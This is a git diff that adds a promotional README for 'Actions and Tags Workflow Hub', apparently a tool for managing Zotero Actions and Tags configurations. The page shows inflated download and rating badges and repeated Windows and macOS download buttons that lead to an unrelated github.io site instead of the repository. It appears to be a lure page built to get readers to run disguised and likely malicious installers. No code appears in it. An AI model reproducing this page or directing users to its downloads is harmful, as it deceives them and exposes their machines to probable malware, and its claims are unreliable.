@@ -1,2 +1,91 @@
-# actions-and-tags-workflow-hub
-Custom action and tag automation hub for Zotero Actions and Tags
+# ⚡ Actions and Tags Workflow Hub
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Downloads-50K%2B-8E44AD?style=for-the-badge&logo=github" />
+  <img src="https://img.shields.io/badge/Rating-4.9%2F5-8E44AD?style=for-the-badge&logo=star" />
+  <img src="https://img.shields.io/badge/Version-Latest-101010?style=for-the-badge&logo=github" />
+  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
+  <img src="https://img.shields.io/badge/Productivity%20Tools-8E44AD?style=for-the-badge" />
+</p>
+
+**⚡ Actions and Tags Workflow Hub** — Custom action and tag automation hub for Zotero Actions and Tags. Actions and Tags Workflow Hub organizes your Zotero automation configurations. Build custom right-click action libraries, save tag automation rules and maintain consistent tagging and workflow configurations for research management.
+
+<p align="center">
+  <img src="https://skillicons.dev/icons?i=windows" />
+  <img src="https://skillicons.dev/icons?i=apple" />
+  <img src="https://skillicons.dev/icons?i=github" />
+</p>
+
+<p align="center">
+  <img src="https://readme-typing-svg.herokuapp.com?color=8E44AD&size=28&center=true&vCenter=true&width=900&lines=Actions+and+Tags+Workflow+Hub;⭐+Custom+action+and+tag+automation+hub+for+Zotero+Actions+and+Tags;🚀+Action+Library;🔥+Tag+Rules" />
+</p>
+
+<div align="center">
+
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
+
+</div>
+
+<div align="center">
+<img width="200" alt="Actions and Tags Workflow Hub logo" src="https://raw.githubusercontent.com/EnergyDugongElevator/actions-and-tags-workflow-hub/main/logo.png" />
+</div>
+
+---
+
+## 📖 About
+
+🔹 **Actions and Tags Workflow Hub** is a powerful tool built to help you custom action and tag automation hub for Zotero Actions and Tags. Actions and Tags Workflow Hub organizes your Zotero automation configurations. Build custom right-click action libraries, save tag automation rules and maintain consistent tagging and workflow configurations for research management.
+
+🔸 Whether you're a seasoned professional or just getting started, **Actions and Tags Workflow Hub** delivers a clean, intuitive experience packed with everything you need — right out of the box. Join thousands of users who've already streamlined their productivity tools workflow. Download now and get started in minutes. 🚀
+
+---
+
+## 🚀 Features
+
+| **Feature** | **Description** |
+|:---|:---|
+| **Action Library** | Organize custom Zotero right-click actions by workflow type |
+| **Tag Rules** | Save automatic tagging rule configurations per source type |
+| **Workflow Configs** | Build repeatable research workflow action configurations |
+| **Keyboard Shortcuts** | Save keyboard shortcut assignments for frequent Zotero actions |
+
+---
+
+## 📋 System Requirements
+
+| **Component** | **Windows** | **macOS** |
+|---------------|-------------|-----------|
+| **OS** | Windows 10/11 (64-bit) | macOS 12 Monterey or later |
+| **RAM** | 4 GB+ | 4 GB+ |
+| **Storage** | 2 GB free | 2 GB free |
+| **Processor** | Intel i5 / AMD Ryzen 5 | Intel or Apple Silicon |
+
+---
+
+## ⚠️ Legal Disclaimer
+
+| ✅ Allowed | ❌ Not Allowed |
+|------------|----------------|
+| Personal use | Commercial redistribution |
+| Education | Resale |
+| Research & testing | Modification of source files |
+
+---
+
+**Actions and Tags Workflow Hub** — Custom action and tag automation hub for Zotero Actions and Tags.
+
+<div align="center">
+
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
+
+</div>
+
+<p align="center">
+  <img src="https://skillicons.dev/icons?i=windows" />
+  <img src="https://skillicons.dev/icons?i=apple" />
+  <img src="https://skillicons.dev/icons?i=github" />
+</p>
